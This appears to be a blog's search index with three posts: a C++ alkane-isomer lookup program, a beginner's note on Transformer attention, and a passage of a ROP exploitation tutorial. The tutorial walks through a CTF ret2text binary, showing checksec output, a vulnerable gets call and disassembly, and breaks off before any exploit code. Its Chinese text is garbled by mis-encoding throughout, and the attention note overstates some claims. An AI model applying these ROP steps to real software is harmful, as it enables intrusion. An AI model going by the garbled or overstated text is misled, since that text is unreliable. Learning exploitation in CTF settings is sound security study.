<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>C++è®¡ç®—çƒ·çƒƒåŒåˆ†å¼‚æ„ä½“æ•°é‡(ä¸€)</title>
    <link href="/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/"/>
    <url>/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="C-è®¡ç®—çƒ·çƒƒåŒåˆ†å¼‚æ„ä½“æ•°é‡-ä¸€">C++è®¡ç®—çƒ·çƒƒåŒåˆ†å¼‚æ„ä½“æ•°é‡(ä¸€)</h2><h3 id="å¼•å­">å¼•å­</h3><p>äº‹å‡ºæœ‰å› ï¼Œå¾ä»Šä¸ºé«˜ä¸€å­¦å­ï¼Œæ˜¨æ—¥äºåŒ–å­¦è¯¾ä¹ åŠæœ‰æœºç‰©ï¼Œæ°ç•™æ„åˆ° <code>çƒ·çƒƒ</code> ä¹‹ <code>ç™¸çƒ·</code>ï¼Œä»¥å˜å¹»æ— ç«¯ä¹‹ç»“æ„ç»„åˆï¼Œç«Ÿå¾—ä¸ƒåäº”ç§åŒåˆ†å¼‚æ„ä½“ï¼Œå¾è§‰ç”šç‰›è€Œé€¼ä¹‹ï¼Œç„¶è½¬å¿µæ€ä¹‹ï¼Œå½¼è¨€ä¸ƒåäº”ç§ï¼Œæœå¦‚æ˜¯ä¹ï¼Ÿâ€ç„¶å¾æ€§æ‡’ï¼Œå¼—èƒ½ä»¥è‰ç¨¿çº¸åˆ—è¯¸èˆ¬å“ç±»è€Œé€ä¸ªæ•°ä¹‹ã€‚å¿½åˆè½¬å¿µï¼Œå¯å€Ÿç®—æ³•ä»¥è¡Œè®¡ç®—ï¼Œé‚æˆæ­¤æ–‡ã€‚</p><h6 id="smalltalk-æ­¤æ–‡å› å¾æ°´å¹³å°šæµ…ï¼ˆæ–¹å…¥-OI-çº¦ä¸¤æœˆä¸”èµ„è´¨é©½é’ï¼‰ï¼Œæ•…äºå…¶ä¸­å€ŸåŠ©-DeepSeek-ä»¥è¾…åŠ©ç®—æ³•ä¹‹è®¾è®¡ã€‚">smalltalk: æ­¤æ–‡å› å¾æ°´å¹³å°šæµ…ï¼ˆæ–¹å…¥ OI çº¦ä¸¤æœˆä¸”èµ„è´¨é©½é’ï¼‰ï¼Œæ•…äºå…¶ä¸­å€ŸåŠ© DeepSeek ä»¥è¾…åŠ©ç®—æ³•ä¹‹è®¾è®¡ã€‚</h6><h3 id="åˆæ­¥æ€è€ƒ">åˆæ­¥æ€è€ƒ</h3><p>é¦–å…ˆæ¥çœ‹çœ‹æˆ‘ä»¬è¦é€šè¿‡ç®—æ³•å®ç°è®¡ç®—çƒ·çƒƒåŒåˆ†å¼‚æ„ä½“æ•°é‡éœ€è¦å“ªäº›åŸºç¡€çŸ¥è¯†(éƒ¨åˆ†å‚è€ƒæ¥æºäºDeepSeek)</p><table><thead><tr><th style="text-align:left">é¢†åŸŸ</th><th style="text-align:left">å…·ä½“çŸ¥è¯†ç‚¹</th></tr></thead><tbody><tr><td style="text-align:left"><strong>åŒ–å­¦</strong></td><td style="text-align:left">çƒ·çƒƒé€šå¼ã€ç¢³å››ä»·é”®è§„åˆ™ã€åŒåˆ†å¼‚æ„ä½“æ¦‚å¿µã€‚</td></tr><tr><td style="text-align:left"><strong>ç¼–ç¨‹</strong></td><td style="text-align:left">è¾“å…¥è¾“å‡ºã€<code>map</code> å­˜å‚¨é”®å€¼å¯¹ã€æ¡ä»¶è¯­å¥ï¼ˆ<code>if-else</code>ï¼‰ã€‚</td></tr><tr><td style="text-align:left"><strong>æ•°å­¦</strong></td><td style="text-align:left">æŸ¥è¡¨æ³•ï¼ˆé¿å…å¤æ‚è®¡ç®—ï¼Œç›´æ¥å¼•ç”¨å·²çŸ¥ç»“æœï¼‰ã€‚</td></tr><tr><td style="text-align:left"><strong>é—®é¢˜åˆ†è§£</strong></td><td style="text-align:left">å…ˆéªŒè¯è¾“å…¥åˆæ³•æ€§ï¼Œå†é€šè¿‡é¢„å­˜æ•°æ®å¿«é€Ÿè¿”å›ç»“æœã€‚</td></tr></tbody></table><p>è¿›è¡Œè¿›ä¸€æ­¥åˆ†æï¼Œå¾—å‡ºçš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹</p><h4 id="1-åŒ–å­¦çŸ¥è¯†åˆ©ç”¨"><strong>1. åŒ–å­¦çŸ¥è¯†åˆ©ç”¨</strong></h4><ul><li><strong>çƒ·çƒƒé€šå¼</strong>ï¼šC<strong>n</strong>H<strong>2n+2</strong></li><li><strong>ç¢³éª¨æ¶è§„åˆ™</strong>ï¼š<ul><li>æ¯ä¸ªç¢³åŸå­ï¼ˆCï¼‰å¿…é¡»å½¢æˆ <strong>4 ä¸ªå…±ä»·é”®</strong>ï¼ˆä¸å…¶ä»– C æˆ– H åŸå­è¿æ¥ï¼‰</li><li>æ°¢åŸå­ï¼ˆHï¼‰åªèƒ½å½¢æˆ <strong>1 ä¸ªé”®</strong>ï¼Œä¸”ä¸å‚ä¸éª¨æ¶æ„å»º</li></ul></li></ul><h4 id="2-ç®€åŒ–é—®é¢˜"><strong>2. ç®€åŒ–é—®é¢˜</strong></h4><ul><li>ä»…è®¡ç®— <strong>ç¢³éª¨æ¶çš„éç¯çŠ¶ç»“æ„</strong>ï¼ˆä¸è€ƒè™‘ç«‹ä½“å¼‚æ„æˆ–å¤æ‚å¯¹ç§°æ€§ï¼‰</li><li>æ‰‹åŠ¨é¢„å­˜å°è§„æ¨¡ <strong>n</strong> çš„å¼‚æ„ä½“æ•°é‡ï¼ˆnâ‰¤10ï¼‰ï¼Œé¿å…å¤æ‚ç®—æ³•</li></ul><h4 id="3-ç¼–ç¨‹å®ç°"><strong>3. ç¼–ç¨‹å®ç°</strong></h4><ul><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šæ£€æŸ¥ <em>H</em> æ˜¯å¦ç­‰äº 2C+2</li><li><strong>æŸ¥è¡¨æ³•</strong>ï¼šç›´æ¥è¿”å›é¢„è®¡ç®—çš„å¼‚æ„ä½“æ•°é‡ï¼ˆé€‚ç”¨äº Câ‰¤10ï¼‰</li><li><strong>é€æ­¥æ‰©å±•</strong>ï¼šæœªæ¥å¯å‡çº§åˆ°é€’å½’ç”Ÿæˆç¢³éª¨æ¶</li></ul><h3 id="å…·ä½“åˆ†æ">å…·ä½“åˆ†æ</h3><ol><li><p><strong>è¾“å…¥éªŒè¯</strong></p><p>æˆ‘ä»¬å…ˆæ£€æŸ¥è¾“å…¥çš„<code>H</code>çš„æ•°é‡æ˜¯å¦æ»¡è¶³<code>2C+2</code>ï¼Œå¦åˆ™è¿›è¡Œé”™è¯¯å›æ˜¾</p></li><li><p>æŸ¥è¡¨æ³•</p><ul><li>ä½¿ç”¨ <code>map</code> å­˜å‚¨ n=1âˆ¼10<em>n</em>=1âˆ¼10 çš„å¼‚æ„ä½“æ•°é‡ï¼ˆåˆšå¥½åˆ°ç™¸çƒ·ï¼‰</li><li>ä¾‹å¦‚ï¼š<ul><li><strong>n=4</strong> -&gt; 2ç§å¼‚æ„ä½“ï¼ˆæ­£ä¸çƒ·ã€å¼‚ä¸çƒ·ï¼‰</li><li><strong>n=5</strong> -&gt; 3ç§å¼‚æ„ä½“</li></ul></li></ul></li><li><p>è¾“å‡ºç»“æœ</p><ul><li>ç›´æ¥è¿”å›è¡¨ä¸­å¯¹åº”çš„å¼‚æ„ä½“æ•°é‡ï¼Œè‹¥ n&gt;10 åˆ™æç¤ºä¸æ”¯æŒ</li></ul></li></ol><p>ç°åœ¨æ˜¯æœ€ç»ˆä¼˜åŒ–è¿‡çš„ä»£ç </p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> carbon, hydrogen;    <span class="hljs-comment">// æç¤ºç”¨æˆ·è¾“å…¥ç¢³åŸå­æ•°</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of carbon atoms (C): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;carbon);        <span class="hljs-comment">// æç¤ºç”¨æˆ·è¾“å…¥æ°¢åŸå­æ•°</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of hydrogen atoms (H): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;hydrogen);        <span class="hljs-comment">// éªŒè¯æ˜¯å¦ä¸ºçƒ·çƒƒï¼ˆCnH2n + 2ï¼‰</span>    <span class="hljs-keyword">if</span> (hydrogen != <span class="hljs-number">2</span> * carbon + <span class="hljs-number">2</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: This is not an alkane (expected H = 2C + 2).\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-comment">// é¢„è®¡ç®—çš„çƒ·çƒƒå¼‚æ„ä½“æ•°é‡ï¼ˆn = 1~10ï¼‰</span>    map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; isomerTable = &#123;        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// CH4</span>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C2H6</span>        &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C3H8</span>        &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;,  <span class="hljs-comment">// C4H10ï¼ˆæ­£ä¸çƒ·ã€å¼‚ä¸çƒ·ï¼‰</span>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;,  <span class="hljs-comment">// C5H12</span>        &#123;<span class="hljs-number">6</span>, <span class="hljs-number">5</span>&#125;,  <span class="hljs-comment">// C6H14</span>        &#123;<span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;,  <span class="hljs-comment">// C7H16</span>        &#123;<span class="hljs-number">8</span>, <span class="hljs-number">18</span>&#125;, <span class="hljs-comment">// C8H18</span>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">35</span>&#125;, <span class="hljs-comment">// C9H20</span>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">75</span>&#125; <span class="hljs-comment">// C10H22</span>    &#125;;    <span class="hljs-keyword">if</span> (carbon &gt;= <span class="hljs-number">1</span> &amp;&amp; carbon &lt;= <span class="hljs-number">10</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of alkane isomers for C%dH%d: %d\n&quot;</span>, carbon, hydrogen, isomerTable[carbon]);    &#125;     <span class="hljs-keyword">else</span> &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: Carbon count must be 1~10 (this program is for beginners).\n&quot;</span>);  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>å½“ç„¶ï¼Œæˆ‘ä»¬åªèƒ½è®¡ç®—ç¢³åŸå­æ•°é‡ä¸º10çš„çƒ·çƒƒï¼Œè¡¨ç°å‡ºæˆ‘ä»¬çš„åŠŸèƒ½å®Œå…¨ä¸å¤Ÿå¼ºå¤§ï¼Œæˆ‘ä¹Ÿæ€è€ƒäº†å…³äºåç»­è¡¥å……çš„ä¸€äº›å…¶ä»–æƒ³æ³•ï¼Œè¯¸å¦‚å‡çº§é€’å½’ç®—æ³•ã€å¼•å…¥å›¾è®º(é©¬ä¸ŠæŠŠåŸºç¡€æ‰“å®Œæ»šå»å­¦æ ‘)ç”šè‡³æ˜¯ç»“åˆåŠ¨æ€è§„åˆ’æˆ–ç”Ÿæˆå‡½æ•°ä¼˜åŒ–è®¡ç®—(éœ€å­¦ä¹ ç»„åˆæ•°å­¦)ï¼Œåç»­æˆ‘è¿˜ä¼šæ›´æ–°çš„ æ•¬è¯·æœŸå¾…ï¼</p><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ç®—æ³•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç®—æ³•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Learning Note on Attention is All You Need</title>
    <link href="/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/"/>
    <url>/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/</url>
    
    <content type="html"><![CDATA[<hr><p><em><a href="https://github.com/Solkatt-cn/LLMStudyNotes/tree/main/Google2017AttentionIsAllYouNeed/note.md">You also could click here to download this article.</a></em></p><h3 id="Learning-Note-on-â€œAttention-Is-All-You-Needâ€">Learning Note on â€œAttention Is All You Needâ€</h3><h4 id="For-Absolute-Beginners">For Absolute Beginners:</h4><ol><li>Only basic math required (+, -, Ã—, Ã·)</li><li>All technical terms explained using ğŸ”ğŸ° examples</li><li>Key concepts marked with (â­)</li></ol><hr><h3 id="1-Why-Was-Transformer-Invented">1. Why Was Transformer Invented?</h3><h4 id="1-1-Problems-with-Old-AI-RNN-LSTM-Why-are-traditional-models-like-â€œpass-the-word-gameâ€">1.1 Problems with Old AI (RNN/LSTM): Why are traditional models like â€œpass the word gameâ€?</h4><p>Imagine you are playing a game of pass the word game, and the rules are as follows:</p><p>1.<strong>Strict order</strong>: You must pass the word Aâ†’Bâ†’Câ†’D one by one, and you cannot skip anyone</p><p>2.<strong>Memory decay</strong>: When it reaches the 10th person, the words said by the first person may have changed beyond recognition</p><p>3.<strong>Low efficiency</strong>: You must wait for the previous person to finish speaking</p><h4 id="1-2-How-Humans-Process-Information">1.2 How Humans Process Information</h4><h5 id="Empirical-Observation">Empirical Observation</h5><p>When reading the sentence:<br>â€œAlthough itâ€™s raining, __ forgot an umbrellaâ€<br>Human cognition demonstrates:</p><ol><li><strong>Semantic Association</strong>: Instantaneous strong linkage between â€œrainingâ€ and â€œumbrellaâ€</li><li><strong>Non-sequential Processing</strong>: Accurate prediction of the missing pronoun (â€œhe/sheâ€) without word-by-word reading</li><li><strong>Contextual Integration</strong>: Automatic suppression of irrelevant information (e.g., the concessive â€œalthoughâ€) while focusing on critical concepts</li></ol><h4 id="Cognitive-Science-and-Attention-Mechanism-Alignment">Cognitive Science and Attention Mechanism Alignment</h4><p>This phenomenon directly inspired the <strong>Attention Mechanism</strong> in Transformers:</p><ul><li><p><strong>Key-Value-Query Model</strong><br>The human brain analogously performs:</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/1.png" alt="1"></p></li></ul><p>Then Iâ€™ll explain the formula to you with the understanding of a high school student, Imagine youâ€™re in the cafeteria for lunch (thatâ€™s the attention mechanic!).ï¼š</p><p><strong>Q (Query) - What you need</strong><br>â€œWhat do I want to eat today?â€ (e.g. want to eat spicy food, want to have a full stomach)</p><p><strong>K (Key) - The signboard of the window</strong><br>Menu for each rice window (Window 1: Spicy Fragrant Pot; Window 2: Beef noodlesâ€¦ ï¼‰<br><img src="/images/Learning-Note-on-Attention-is-All-You-Need/2.png" alt></p><p><strong>Degree of matching</strong><br>You take your requirement (Q) and compare it with the menu (K) of each window:</p><ul><li><p>Spicy fragrant pot: spicy âœ…, full-filling âœ…, â†’ high score</p></li><li><p>Beef noodles: slightly spicy âŒ and filling âœ…â†’ medium</p></li><li><p>Salad: not spicy âŒ, not full âŒâ†’ Low score</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/3.png" alt="3"></p></li></ul><p><strong>Prevent â€œDifficulty in Selectionâ€</strong><br>If there are too many menu options (d_k too big), you need to divide by the root number d_k make the score more reasonable, so that all the scores are too high to make a difficult choice</p><p><strong>Softmax - Make a choice</strong><br>Convert fractions into probabilities:</p><ul><li>Spicy Pot: 70%</li><li>Beef noodles: 25%</li><li>Salad: 5%<br>(Itâ€™s like turning fractions into percentages)</li></ul><p><strong>V (Value)â€”Final decision</strong><br><em>Allocate attention based on probability:</em></p><ol><li>70% of the â€œattention fundsâ€ are invested in spicy fragrant pot</li><li>25% to beef noodles</li><li>5% to salads</li><li>The whole process is:<br>You (Q) go to the cafeteria with your needs, compare the menus (K), calculate the matching degree (QK^T), prevent too many options (âˆšd_k), use Softmax to calculate the probability, and finally decide how to distribute the meal money (V)!</li></ol><ul><li><ul><li>So when processing â€œrainingâ€ (as Query), it automatically retrieves association strength (Value) with â€œumbrellaâ€ (Key)</li></ul></li><li><strong>Global Perception</strong><br>Sequential processing in traditional RNNs vs. human parallel processing â†’ Transformerâ€™s self-attention design</li></ul><h4 id="Core-Implications-Attention-Is-All-You-Need">Core Implications (<em>Attention Is All You Need</em>)</h4><ol><li><strong>Long-Range Dependency</strong><br>Humans handle â€œAlthoughâ€¦umbrellaâ€ without distance constraints â†’ Transformerâ€™s attention window overcomes RNN gradient vanishing</li><li><strong>Dynamic Weight Allocation</strong><br>Humans assign higher weight to â€œumbrellaâ€ â†’ Modelâ€™s attention scores automatically learn feature importance</li><li><strong>Cross-Modality Generality</strong><br>The same mechanism applies to vision (local image regions) and speech (phoneme alignment)</li></ol><h4 id="Comparative-Evidence">Comparative Evidence</h4><table><thead><tr><th style="text-align:left">Processing Mode</th><th style="text-align:left">Human Performance</th><th style="text-align:left">Transformer Performance</th></tr></thead><tbody><tr><td style="text-align:left">Association Span</td><td style="text-align:left">Unlimited distance</td><td style="text-align:left">Theoretically infinite</td></tr><tr><td style="text-align:left">Processing Speed</td><td style="text-align:left">200-300ms/concept</td><td style="text-align:left">O(1)-level parallelism</td></tr><tr><td style="text-align:left">Error Patterns</td><td style="text-align:left">Semantic interference (e.g., â€œsunnyâ€)</td><td style="text-align:left">Similarity matrix confusion</td></tr></tbody></table><blockquote><p>Key Conclusion: The attention mechanism mathematically models human information processing, validating the cognitive hypothesis that â€œassociation takes precedence over sequenceâ€.</p></blockquote><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ML / LLM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI/ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic ROP Learning</title>
    <link href="/2025/04/19/Basic-ROP-Learning/"/>
    <url>/2025/04/19/Basic-ROP-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="Basic-ROP-Learning">Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-æ¦‚è¿°">ROP(Return-Oriented Programming)æ¦‚è¿°</h2><p>ROP(Return-Oriented Programming)æ˜¯ä¸€ç§é«˜çº§çš„<strong>ä»£ç å¤ç”¨æ”»å‡»æŠ€æœ¯</strong>ï¼Œä¸»è¦ç”¨äºç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶ï¼ˆå¦‚DEP/NXï¼‰ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong></p><h3 id="1-åŸºæœ¬æ¦‚å¿µ">1.Â <strong>åŸºæœ¬æ¦‚å¿µ</strong></h3><h4 id="ï¼ˆ1ï¼‰äº§ç”ŸèƒŒæ™¯">ï¼ˆ1ï¼‰äº§ç”ŸèƒŒæ™¯</h4><ul><li><p><strong>DEP/NXé˜²æŠ¤</strong>ï¼šç°ä»£ç³»ç»Ÿç¦æ­¢æ‰§è¡Œæ ˆ/å †ä¸Šçš„ä»£ç ï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ã€‚</p></li><li><p><strong>ASLRé˜²æŠ¤</strong>ï¼šéšæœºåŒ–å†…å­˜å¸ƒå±€ï¼Œå¢åŠ é¢„æµ‹éš¾åº¦ã€‚</p></li><li><p><strong>ROPåº”å¯¹æ–¹æ¡ˆ</strong>ï¼šå¤ç”¨å·²æœ‰ä»£ç ï¼ˆ<code>.text</code>æ®µï¼‰ï¼Œé¿å…ç›´æ¥æ³¨å…¥shellcodeã€‚</p></li></ul><h4 id="ï¼ˆ2ï¼‰æ ¸å¿ƒåŸç†">ï¼ˆ2ï¼‰æ ¸å¿ƒåŸç†</h4><ul><li><p><strong>Gadget</strong>ï¼šä»¥<code>ret</code>æŒ‡ä»¤ç»“å°¾çš„çŸ­æŒ‡ä»¤åºåˆ—ï¼ˆå¦‚<code>pop eax; ret</code>ï¼‰ã€‚</p></li><li><p><strong>é“¾å¼è°ƒç”¨</strong>ï¼šé€šè¿‡ç²¾å¿ƒæ„é€ æ ˆå¸§ï¼Œä½¿<code>ret</code>æŒ‡ä»¤è·³è½¬åˆ°ä¸‹ä¸€ä¸ªgadgetï¼Œå½¢æˆ&quot;ä»£ç é“¾&quot;ã€‚</p></li></ul><hr><h3 id="2-å…³é”®ç»„ä»¶">2.Â <strong>å…³é”®ç»„ä»¶</strong></h3><table><thead><tr><th>ç»„ä»¶</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><strong>Gadget</strong></td><td>ç¨‹åºä¸­åŸæœ‰çš„çŸ­æŒ‡ä»¤åºåˆ—ï¼ˆé€šå¸¸ä»¥<code>ret</code>ç»“å°¾ï¼‰ï¼Œå®ç°åŸºæœ¬æ“ä½œï¼ˆå¦‚è¯»å†™å¯„å­˜å™¨ï¼‰ã€‚</td></tr><tr><td><strong>ROP Chain</strong></td><td>ç”±å¤šä¸ªgadgetåœ°å€å’Œå‚æ•°ç»„æˆçš„æ ˆæ•°æ®ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</td></tr><tr><td><strong>Stack Pivot</strong></td><td>å°†æ ˆæŒ‡é’ˆï¼ˆESP/RSPï¼‰è½¬ç§»åˆ°æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼ˆå¦‚å †ï¼‰ï¼Œä¾¿äºæ„é€ é“¾ã€‚</td></tr></tbody></table><hr><h3 id="3-æ”»å‡»æ­¥éª¤">3.Â <strong>æ”»å‡»æ­¥éª¤</strong></h3><ol><li><p><strong>ä¿¡æ¯æ³„éœ²</strong></p><ul><li>è·å–å†…å­˜åœ°å€ï¼ˆç»•è¿‡ASLRï¼‰ï¼Œå¦‚é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€ã€‚</li></ul></li><li><p><strong>å¯»æ‰¾Gadgets</strong></p><ul><li>ä½¿ç”¨å·¥å…·ï¼ˆå¦‚<code>ROPgadget</code>ã€<code>ropper</code>ï¼‰æ‰«æäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ”¶é›†å¯ç”¨gadgetsã€‚</li></ul></li><li><p><strong>æ„é€ ROP Chain</strong></p><ul><li>ç»„åˆgadgetså®ç°ç›®æ ‡åŠŸèƒ½ï¼ˆå¦‚è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>ï¼‰ã€‚</li></ul></li><li><p><strong>è§¦å‘æ¼æ´</strong></p><ul><li>é€šè¿‡æ ˆæº¢å‡ºç­‰æ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œè·³è½¬åˆ°ç¬¬ä¸€ä¸ªgadgetã€‚</li></ul></li></ol><hr><h3 id="4-é˜²å¾¡æªæ–½">4.Â <strong>é˜²å¾¡æªæ–½</strong></h3><table><thead><tr><th>é˜²å¾¡æŠ€æœ¯</th><th>åŸç†</th></tr></thead><tbody><tr><td><strong>ASLR</strong></td><td>éšæœºåŒ–å†…å­˜å¸ƒå±€ï¼Œå¢åŠ gadgetåœ°å€é¢„æµ‹éš¾åº¦ã€‚</td></tr><tr><td><strong>Stack Canary</strong></td><td>åœ¨æ ˆå¸§ä¸­æ’å…¥æ ¡éªŒå€¼ï¼Œé˜²æ­¢è¿”å›åœ°å€è¢«è¦†ç›–ã€‚</td></tr><tr><td><strong>CFI</strong></td><td>æ§åˆ¶æµå®Œæ•´æ€§ï¼ˆControl-Flow Integrityï¼‰ï¼Œé™åˆ¶è·³è½¬ç›®æ ‡ä»…ä¸ºåˆæ³•åœ°å€ã€‚</td></tr><tr><td><strong>PIC/PIE</strong></td><td>ä½ç½®æ— å…³ä»£ç ï¼Œå¢å¼ºASLRæ•ˆæœã€‚</td></tr></tbody></table><h3 id="5-å®ä¾‹-Linux-x86-ROP-Exploit">5.å®ä¾‹ Linux x86 ROP Exploit</h3><h5 id="1-ret2text">(1) ret2text</h5><ul><li><h4 id="åŸºæœ¬åˆ†æ"><strong>åŸºæœ¬åˆ†æ</strong></h4></li></ul><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ç‚¹å‡»ä¸‹è½½: ret2text</a></p><p>å…ˆçœ‹çœ‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p><div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes</code></pre></div><p>å¯ä»¥çœ‹å‡ºç¨‹åºæ˜¯ 32 ä½ç¨‹åºï¼Œä¸”ä»…å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ IDA åç¼–è¯‘è¯¥ç¨‹åºï¼š</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);  <span class="hljs-built_in">gets</span>(s);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨<code>main</code>å‡½æ•°ä½¿ç”¨äº†å¾ˆå¯ç–‘çš„<code>gets</code>ï¼Œé‚£ç¨‹åºä¸­å°±å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬å›åˆ°IDAçœ‹åæ±‡ç¼–ä»£ç </p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;.text:<span class="hljs-number">0</span>80485FD                 push    ebp.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer.text:<span class="hljs-number">0</span>804860A                 call    _time.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed.text:<span class="hljs-number">0</span>8048612                 call    _srand.text:<span 